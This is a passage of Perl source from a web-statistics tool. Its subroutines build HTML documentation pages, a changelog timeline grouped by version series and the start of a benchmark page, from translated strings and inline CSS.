ul{grid-template-columns:1fr}.scenarios-grid{grid-template-columns:1fr}.more-links{flex-direction:column;align-items:stretch}.more-link{justify-content:center}.compare-table{font-size:0.9rem}.compare-table th,.compare-table td{padding:10px 8px}}\@media (max-width:480px){.what-content{padding:15px}.intro-box,.history-box,.requirements-box,.scenario-card{padding:20px}.feature-item{padding:20px 15px}.more-link{padding:10px 20px}}
	</style>
	<h1>$doc_title</h1>
		$content
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
	</div>
	$theme_script
END_HTML
	print $html;
}
#------------------------------------------------------------------------------
# 生成 changelog 文档页面 (修正版)
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_changelog_doc {
	my ($dir) = @_;
	
	my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $theme_script = get_theme_script();
	my $full_title = _t("docs.changelog.title") . " - " . "$page_title";
	my $doc_title = _t("docs.changelog.title");
	my $subtitle = _t("docs.changelog.subtitle");
	my $warning = _t("docs.changelog.warning");
	my $SPONSOR_SECTION = sprintf( _t("sponsor.section"), $StatsUrl );
	my $changelog_8_1_date = _t("changelog.8.1.date");
	my $changelog_8_1_version = _t("changelog.8.1.version");
	my $Community = _t("Community Edition");
	my $Final = _t("Final Version (Original Author)");
	my $changelog_8_1_items = _t("changelog.8.1.items");
	my $changelog_8_0_date = _t("changelog.8.0.date");
	my $changelog_8_0_version = _t("changelog.8.0.version");
	my $changelog_8_0_items = _t("changelog.8.0.items");
	my $changelog_7_9_date = _t("changelog.7.9.date");
	my $changelog_7_9_version = _t("changelog.7.9.version");
	my $changelog_7_9_items = _t("changelog.7.9.items");
	
	my $changelog_7_8_date = _t("changelog.7.8.date");
	my $changelog_7_8_version = _t("changelog.7.8.version");
	my $changelog_7_8_items = _t("changelog.7.8.items");
	
	my $changelog_7_7_date = _t("changelog.7.7.date");
	my $changelog_7_7_version = _t("changelog.7.7.version");
	my $changelog_7_7_items = _t("changelog.7.7.items");
	
	my $changelog_7_6_date = _t("changelog.7.6.date");
	my $changelog_7_6_version = _t("changelog.7.6.version");
	my $changelog_7_6_items = _t("changelog.7.6.items");
	
	my $changelog_7_5_date = _t("changelog.7.5.date");
	my $changelog_7_5_version = _t("changelog.7.5.version");
	my $changelog_7_5_items = _t("changelog.7.5.items");
	
	my $changelog_7_4_date = _t("changelog.7.4.date");
	my $changelog_7_4_version = _t("changelog.7.4.version");
	my $changelog_7_4_items = _t("changelog.7.4.items");
	
	my $changelog_7_3_date = _t("changelog.7.3.date");
	my $changelog_7_3_version = _t("changelog.7.3.version");
	my $changelog_7_3_items = _t("changelog.7.3.items");
	
	my $changelog_7_2_date = _t("changelog.7.2.date");
	my $changelog_7_2_version = _t("changelog.7.2.version");
	my $changelog_7_2_items = _t("changelog.7.2.items");
	
	my $changelog_7_1_1_date = _t("changelog.7.1.1.date");
	my $changelog_7_1_1_version = _t("changelog.7.1.1.version");
	my $changelog_7_1_1_items = _t("changelog.7.1.1.items");
	
	my $changelog_7_1_date = _t("changelog.7.1.date");
	my $changelog_7_1_version = _t("changelog.7.1.version");
	my $changelog_7_1_items = _t("changelog.7.1.items");
	
	my $changelog_7_0_date = _t("changelog.7.0.date");
	my $changelog_7_0_version = _t("changelog.7.0.version");
	my $changelog_7_0_items = _t("changelog.7.0.items");
	
	# 6.x 系列
	my $changelog_6_95_date = _t("changelog.6.95.date");
	my $changelog_6_95_version = _t("changelog.6.95.version");
	my $changelog_6_95_items = _t("changelog.6.95.items");
	
	my $changelog_6_9_date = _t("changelog.6.9.date");
	my $changelog_6_9_version = _t("changelog.6.9.version");
	my $changelog_6_9_items = _t("changelog.6.9.items");
	
	my $changelog_6_8_date = _t("changelog.6.8.date");
	my $changelog_6_8_version = _t("changelog.6.8.version");
	my $changelog_6_8_items = _t("changelog.6.8.items");
	
	my $changelog_6_7_date = _t("changelog.6.7.date");
	my $changelog_6_7_version = _t("changelog.6.7.version");
	my $changelog_6_7_items = _t("changelog.6.7.items");
	
	my $changelog_6_6_date = _t("changelog.6.6.date");
	my $changelog_6_6_version = _t("changelog.6.6.version");
	my $changelog_6_6_items = _t("changelog.6.6.items");
	
	my $changelog_6_5_date = _t("changelog.6.5.date");
	my $changelog_6_5_version = _t("changelog.6.5.version");
	my $changelog_6_5_items = _t("changelog.6.5.items");
	
	my $changelog_6_4_date = _t("changelog.6.4.date");
	my $changelog_6_4_version = _t("changelog.6.4.version");
	my $changelog_6_4_items = _t("changelog.6.4.items");
	
	my $changelog_6_3_date = _t("changelog.6.3.date");
	my $changelog_6_3_version = _t("changelog.6.3.version");
	my $changelog_6_3_items = _t("changelog.6.3.items");
	
	my $changelog_6_2_date = _t("changelog.6.2.date");
	my $changelog_6_2_version = _t("changelog.6.2.version");
	my $changelog_6_2_items = _t("changelog.6.2.items");
	
	my $changelog_6_1_date = _t("changelog.6.1.date");
	my $changelog_6_1_version = _t("changelog.6.1.version");
	my $changelog_6_1_items = _t("changelog.6.1.items");
	
	my $changelog_6_0_date = _t("changelog.6.0.date");
	my $changelog_6_0_version = _t("changelog.6.0.version");
	my $changelog_6_0_items = _t("changelog.6.0.items");
	
	# 5.x 系列
	my $changelog_5_9_date = _t("changelog.5.9.date");
	my $changelog_5_9_version = _t("changelog.5.9.version");
	my $changelog_5_9_items = _t("changelog.5.9.items");
	
	my $changelog_5_8_date = _t("changelog.5.8.date");
	my $changelog_5_8_version = _t("changelog.5.8.version");
	my $changelog_5_8_items = _t("changelog.5.8.items");
	
	my $changelog_5_7_date = _t("changelog.5.7.date");
	my $changelog_5_7_version = _t("changelog.5.7.version");
	my $changelog_5_7_items = _t("changelog.5.7.items");
	
	my $changelog_5_6_date = _t("changelog.5.6.date");
	my $changelog_5_6_version = _t("changelog.5.6.version");
	my $changelog_5_6_items = _t("changelog.5.6.items");
	
	my $changelog_5_5_date = _t("changelog.5.5.date");
	my $changelog_5_5_version = _t("changelog.5.5.version");
	my $changelog_5_5_items = _t("changelog.5.5.items");
	
	my $changelog_5_4_date = _t("changelog.5.4.date");
	my $changelog_5_4_version = _t("changelog.5.4.version");
	my $changelog_5_4_items = _t("changelog.5.4.items");
	
	my $changelog_5_3_date = _t("changelog.5.3.date");
	my $changelog_5_3_version = _t("changelog.5.3.version");
	my $changelog_5_3_items = _t("changelog.5.3.items");
	
	my $changelog_5_2_date = _t("changelog.5.2.date");
	my $changelog_5_2_version = _t("changelog.5.2.version");
	my $changelog_5_2_items = _t("changelog.5.2.items");
	
	my $changelog_5_1_date = _t("changelog.5.1.date");
	my $changelog_5_1_version = _t("changelog.5.1.version");
	my $changelog_5_1_items = _t("changelog.5.1.items");
	
	my $changelog_5_0_date = _t("changelog.5.0.date");
	my $changelog_5_0_version = _t("changelog.5.0.version");
	my $changelog_5_0_items = _t("changelog.5.0.items");
	
	# 4.x 系列
	my $changelog_4_1_date = _t("changelog.4.1.date");
	my $changelog_4_1_version = _t("changelog.4.1.version");
	my $changelog_4_1_items = _t("changelog.4.1.items");
	
	my $changelog_4_0_date = _t("changelog.4.0.date");
	my $changelog_4_0_version = _t("changelog.4.0.version");
	my $changelog_4_0_items = _t("changelog.4.0.items");
	
	# 3.x 系列
	my $changelog_3_2_date = _t("changelog.3.2.date");
	my $changelog_3_2_version = _t("changelog.3.2.version");
	my $changelog_3_2_items = _t("changelog.3.2.items");
	
	my $changelog_3_1_date = _t("changelog.3.1.date");
	my $changelog_3_1_version = _t("changelog.3.1.version");
	my $changelog_3_1_items = _t("changelog.3.1.items");
	
	my $changelog_3_0_date = _t("changelog.3.0.date");
	my $changelog_3_0_version = _t("changelog.3.0.version");
	my $changelog_3_0_items = _t("changelog.3.0.items");
	
	# 2.x 系列
	my $changelog_2_24_date = _t("changelog.2.24.date");
	my $changelog_2_24_version = _t("changelog.2.24.version");
	my $changelog_2_24_items = _t("changelog.2.24.items");
	
	my $changelog_2_23_date = _t("changelog.2.23.date");
	my $changelog_2_23_version = _t("changelog.2.23.version");
	my $changelog_2_23_items = _t("changelog.2.23.items");
	
	my $changelog_2_1_date = _t("changelog.2.1.date");
	my $changelog_2_1_version = _t("changelog.2.1.version");
	my $changelog_2_1_items = _t("changelog.2.1.items");
	
	# 1.x 系列
	my $changelog_1_0_date = _t("changelog.1.0.date");
	my $changelog_1_0_version = _t("changelog.1.0.version");
	my $changelog_1_0_items = _t("changelog.1.0.items");
	
	# 早期开发阶段
	my $early_items = _t("changelog.early.1999.items");
	my $series_8_title = _t("series.8.title");
	my $series_7_title = _t("series.7.title");
	my $series_6_title = _t("series.6.title");
	my $series_5_title = _t("series.5.title");
	my $series_4_title = _t("series.4.title");
	my $series_3_title = _t("series.3.title");
	my $series_2_title = _t("series.2.title");
	my $series_1_title = _t("series.1.title");
	my $series_early_title = _t("series.early.title");
	my $footer_note = _t("footer.note");
	# 获取语言和方向
	my $lang = $Lang || 'en-us';
	my $dir_attr = $PageDir ? 'rtl' : 'ltr';
	
	my $html = <<"END_HTML";
	<title>$full_title</title>
	<style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--card-bg:#ffffff;--surface-secondary:#f9fafb;--timeline-color:#3b82f6;--warning-bg:#fff3cd;--warning-border:#ffeeba;--warning-color:#856404;--series-8:#8b5cf6;--series-7:#10b981;--series-6:#f59e0b;--series-5:#ef4444;--series-4:#6366f1;--series-3:#ec4899;--series-2:#14b8a6;--series-1:#f97316;--series-early:#6b7280}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--card-bg:#2d3748;--surface-secondary:#1f2937;--timeline-color:#60a5fa;--warning-bg:#332e1c;--warning-border:#665c2c;--warning-color:#ffd966;--series-8:#a78bfa;--series-7:#34d399;--series-6:#fbbf24;--series-5:#f87171;--series-4:#818cf8;--series-3:#f472b6;--series-2:#2dd4bf;--series-1:#fb923c;--series-early:#9ca3af}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1000px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}h1{color:var(--text-color);border-bottom:2px solid var(--timeline-color);padding-bottom:10px;font-size:2em}.subtitle{color:var(--text-color);opacity:0.8;font-style:italic;margin-bottom:20px;font-size:1.1em}.doc-nav{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border:1px solid var(--border-color);display:flex;gap:15px;flex-wrap:wrap}.doc-nav a{color:var(--link-color);text-decoration:none;padding:5px 10px;border-radius:4px}.doc-nav a:hover{background-color:var(--border-color)}.warning{background-color:var(--warning-bg);border:1px solid var(--warning-border);color:var(--warning-color);padding:15px;border-radius:8px;margin:20px 0;font-weight:500;font-size:1.1em}.timeline{position:relative;padding:20px 0}.timeline::before{content:'';position:absolute;left:180px;top:0;bottom:0;width:2px;background:var(--timeline-color);opacity:0.3}.series-header{margin:40px 0 20px 180px;font-size:1.5em;font-weight:700;padding-bottom:8px;border-bottom:2px solid}.series-8{border-color:var(--series-8);color:var(--series-8)}.series-7{border-color:var(--series-7);color:var(--series-7)}.series-6{border-color:var(--series-6);color:var(--series-6)}.series-5{border-color:var(--series-5);color:var(--series-5)}.series-4{border-color:var(--series-4);color:var(--series-4)}.series-3{border-color:var(--series-3);color:var(--series-3)}.series-2{border-color:var(--series-2);color:var(--series-2)}.series-1{border-color:var(--series-1);color:var(--series-1)}.series-early{border-color:var(--series-early);color:var(--series-early)}.version-item{position:relative;margin-bottom:30px;padding-left:200px}.version-date{position:absolute;left:0;width:160px;font-weight:600;color:var(--timeline-color);text-align:right;font-size:1.1em;padding-right:20px}.version-marker{position:absolute;left:174px;width:12px;height:12px;border-radius:50%;background:var(--timeline-color);border:2px solid var(--bg-color);box-shadow:0 0 0 2px var(--timeline-color);z-index:2}.version-content{background:var(--header-bg);border:1px solid var(--border-color);border-radius:12px;padding:20px;transition:transform 0.2s,box-shadow 0.2s}.version-content:hover{transform:translateX(5px);box-shadow:0 4px 12px rgba(0,0,0,0.1)}.version-header{display:flex;align-items:center;gap:12px;margin-bottom:15px;flex-wrap:wrap}.version-tag{font-size:1.3em;font-weight:700;color:var(--timeline-color)}.version-badge{background:var(--timeline-color);color:white;padding:4px 12px;border-radius:20px;font-size:0.85em;font-weight:500}.version-items{list-style:none;margin:0;padding:0}.version-items li{margin:8px 0;padding:10px 15px 10px 40px;background-color:var(--surface-secondary);border:1px solid var(--border-color);border-radius:8px;position:relative;transition:all 0.2s ease}.version-items li:hover{transform:translateX(5px);background-color:var(--border-color);box-shadow:0 4px 8px rgba(0,0,0,0.1)}.version-items li::before{content:"•";position:absolute;left:15px;color:var(--timeline-color);font-weight:bold;font-size:1.2rem}.version-items li em{color:var(--timeline-color);font-style:italic}.series-8 .version-items li{border-left:4px solid var(--series-8)}.series-7 .version-items li{border-left:4px solid var(--series-7)}.series-6 .version-items li{border-left:4px solid var(--series-6)}.series-5 .version-items li{border-left:4px solid var(--series-5)}.series-4 .version-items li{border-left:4px solid var(--series-4)}.series-3 .version-items li{border-left:4px solid var(--series-3)}.series-2 .version-items li{border-left:4px solid var(--series-2)}.series-1 .version-items li{border-left:4px solid var(--series-1)}.series-early .version-items li{border-left:4px solid var(--series-early)}.early-stage{margin:40px 0 20px 180px;padding:20px;background:var(--header-bg);border:1px solid var(--border-color);border-radius:12px;border-left:4px solid var(--series-early)}.early-stage h3{margin-top:0;color:var(--series-early)}.early-stage ul{margin:10px 0 0;padding-left:20px}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}.footer-note{margin-top:40px;padding:20px;background:var(--header-bg);border-radius:8px;border:1px solid var(--border-color);text-align:center;font-size:0.95em;opacity:0.8}
	</style>
	<h1>$doc_title</h1>
	<div class="subtitle">$subtitle</div>
	<div class="warning">$warning</div>
	<div class="timeline">
		<div class="series-header series-8">$series_8_title</div>
		<div class="version-item">
			<div class="version-date">$changelog_8_1_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_8_1_version</span>
					<span class="version-badge" style="background: var(--series-8);">$Community</span>
				</div>
				<ul class="version-items">
					$changelog_8_1_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_8_0_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_8_0_version</span>
					<span class="version-badge" style="background: var(--series-8);">$Final</span>
				</div>
				<ul class="version-items">
					$changelog_8_0_items
				</ul>
			</div>
		</div>
		
		<div class="series-header series-7">$series_7_title</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_7_9_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_7_9_version</span>
				</div>
				<ul class="version-items">
					$changelog_7_9_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_7_8_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_7_8_version</span>
				</div>
				<ul class="version-items">
					$changelog_7_8_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_7_7_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_7_7_version</span>
				</div>
				<ul class="version-items">
					$changelog_7_7_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_7_6_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_7_6_version</span>
				</div>
				<ul class="version-items">
					$changelog_7_6_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_7_5_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_7_5_version</span>
				</div>
				<ul class="version-items">
					$changelog_7_5_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_7_4_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_7_4_version</span>
				</div>
				<ul class="version-items">
					$changelog_7_4_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_7_3_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_7_3_version</span>
				</div>
				<ul class="version-items">
					$changelog_7_3_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_7_2_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_7_2_version</span>
				</div>
				<ul class="version-items">
					$changelog_7_2_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_7_1_1_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_7_1_1_version</span>
				</div>
				<ul class="version-items">
					$changelog_7_1_1_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_7_1_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_7_1_version</span>
				</div>
				<ul class="version-items">
					$changelog_7_1_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_7_0_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_7_0_version</span>
				</div>
				<ul class="version-items">
					$changelog_7_0_items
				</ul>
			</div>
		</div>
		
		<div class="series-header series-6">$series_6_title</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_6_95_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_6_95_version</span>
				</div>
				<ul class="version-items">
					$changelog_6_95_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_6_9_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_6_9_version</span>
				</div>
				<ul class="version-items">
					$changelog_6_9_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_6_8_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_6_8_version</span>
				</div>
				<ul class="version-items">
					$changelog_6_8_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_6_7_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_6_7_version</span>
				</div>
				<ul class="version-items">
					$changelog_6_7_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_6_6_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_6_6_version</span>
				</div>
				<ul class="version-items">
					$changelog_6_6_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_6_5_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_6_5_version</span>
				</div>
				<ul class="version-items">
					$changelog_6_5_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_6_4_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_6_4_version</span>
				</div>
				<ul class="version-items">
					$changelog_6_4_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_6_3_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_6_3_version</span>
				</div>
				<ul class="version-items">
					$changelog_6_3_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_6_2_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_6_2_version</span>
				</div>
				<ul class="version-items">
					$changelog_6_2_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_6_1_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_6_1_version</span>
				</div>
				<ul class="version-items">
					$changelog_6_1_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_6_0_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_6_0_version</span>
				</div>
				<ul class="version-items">
					$changelog_6_0_items
				</ul>
			</div>
		</div>
		
		<div class="series-header series-5">$series_5_title</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_5_9_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_5_9_version</span>
				</div>
				<ul class="version-items">
					$changelog_5_9_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_5_8_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_5_8_version</span>
				</div>
				<ul class="version-items">
					$changelog_5_8_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_5_7_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_5_7_version</span>
				</div>
				<ul class="version-items">
					$changelog_5_7_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_5_6_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_5_6_version</span>
				</div>
				<ul class="version-items">
					$changelog_5_6_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_5_5_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_5_5_version</span>
				</div>
				<ul class="version-items">
					$changelog_5_5_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_5_4_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_5_4_version</span>
				</div>
				<ul class="version-items">
					$changelog_5_4_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_5_3_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_5_3_version</span>
				</div>
				<ul class="version-items">
					$changelog_5_3_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_5_2_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_5_2_version</span>
				</div>
				<ul class="version-items">
					$changelog_5_2_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_5_1_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_5_1_version</span>
				</div>
				<ul class="version-items">
					$changelog_5_1_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_5_0_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_5_0_version</span>
				</div>
				<ul class="version-items">
					$changelog_5_0_items
				</ul>
			</div>
		</div>
		
		<div class="series-header series-4">$series_4_title</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_4_1_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_4_1_version</span>
				</div>
				<ul class="version-items">
					$changelog_4_1_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_4_0_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_4_0_version</span>
				</div>
				<ul class="version-items">
					$changelog_4_0_items
				</ul>
			</div>
		</div>
		
		<div class="series-header series-3">$series_3_title</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_3_2_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_3_2_version</span>
				</div>
				<ul class="version-items">
					$changelog_3_2_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_3_1_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_3_1_version</span>
				</div>
				<ul class="version-items">
					$changelog_3_1_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_3_0_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_3_0_version</span>
				</div>
				<ul class="version-items">
					$changelog_3_0_items
				</ul>
			</div>
		</div>
		
		<div class="series-header series-2">$series_2_title</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_2_24_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_2_24_version</span>
				</div>
				<ul class="version-items">
					$changelog_2_24_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_2_23_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_2_23_version</span>
				</div>
				<ul class="version-items">
					$changelog_2_23_items
				</ul>
			</div>
		</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_2_1_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_2_1_version</span>
				</div>
				<ul class="version-items">
					$changelog_2_1_items
				</ul>
			</div>
		</div>
		
		<div class="series-header series-1">$series_1_title</div>
		
		<div class="version-item">
			<div class="version-date">$changelog_1_0_date</div>
			<div class="version-marker"></div>
			<div class="version-content">
				<div class="version-header">
					<span class="version-tag">$changelog_1_0_version</span>
				</div>
				<ul class="version-items">
					$changelog_1_0_items
				</ul>
			</div>
		</div>
		
		<div class="early-stage">
			<h3 class="series-early">$series_early_title</h3>
			<ul>
				$early_items
			</ul>
		</div>
	</div>
	
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
	</div>
$theme_script
END_HTML
	print $html;
}

#------------------------------------------------------------------------------
# 生成 benchmark 文档页面
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_benchmark_doc {
	my ($dir) = @_;
	
	
	my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $theme_script = get_theme_script();
	# 文档标题和副标题
	my $doc_title = _t("docs.benchmark.title");
	my $subtitle = _t("docs.benchmark.subtitle");
	my $intro = _t("docs.benchmark.intro");
	my $SPONSOR_SECTION = sprintf( _t("sponsor.section"), $StatsUrl );
	my $full_title = "$doc_title - $page_title";
	my $content = _t("docs.benchmark.content");
	$content =~ s/\\n/\n/g;
	# 获取语言和方向
	my $lang = $Lang || 'en-us';
	my $dir_attr = $PageDir ? 'rtl' : 'ltr';
	
	my $html = <<"END_HTML";
	<title>$full_title</title>
	<style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--table-header-bg:#1e40af;--table-header-text:#ffffff;--table-border:#d1d5db;--table-stripe:#f3f4f6;--table-hover:#e2e8f0;--warning-bg:#fff3cd;--warning-border:#ffeeba;--warning-color:#856404;--star-color:#fbbf24;--accent:#2563eb;--card-bg:#ffffff;--important-bg:#fee2e2;--important-border:#ef4444}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--table-header-bg:#1e3a8a;--table-header-text:#ffffff;--table-border:#4b5563;--table-stripe:#2d3748;--table-hover:#374151;--warning-bg:#332e1c;--warning-border:#665c2c;--warning-color:#ffd966;--star-color:#fbbf24;--accent:#60a5fa;--card-bg:#1f2937;--important-bg:#451a1a;--important-border:#ef4444}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1200px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1,h2,h3{color:var(--text-color);border-bottom:2px solid var(--border-color);padding-bottom:10px}h1{font-size:2em}h2{font-size:1.5em;margin-top:30px}h3{font-size:1.3em}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}.doc-nav{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border:1px solid var(--border-color);display:flex;gap:15px;flex-wrap:wrap}.doc-nav a{padding:5px 10px;border-radius:4px}.doc-nav a:hover{background-color:var(--border-color);text-decoration:none}.warning-box{background-color:var(--warning-bg);border:1px solid var(--warning-border);color:var(--warning-color);padding:15px;border-radius:8px;margin:20px 0;font-weight:500}.benchmark-table{width:100%;border-collapse:collapse;margin:25px 0;font-size:0.95em;box-shadow:0 4px 6px -1px rgba(0,0,0,0.1),0 2px 4px -1px rgba(0,0,0,0.06);border-radius:12px;overflow:hidden}.benchmark-table th{background-color:var(--table-header-bg);color:var(--table-header-text);border:1px solid var(--table-border);padding:14px 8px;text-align:center;font-weight:600;font-size:0.95em;white-space:nowrap}.benchmark-table td{border:1px solid var(--table-border);padding:12px 8px;vertical-align:top;background-color:var(--bg-color)}.benchmark-table tr:nth-child(even) td{background-color:var(--table-stripe)}.benchmark-table tr:hover td{background-color:var(--table-hover);transition:background-color 0.15s ease}.benchmark-table tr 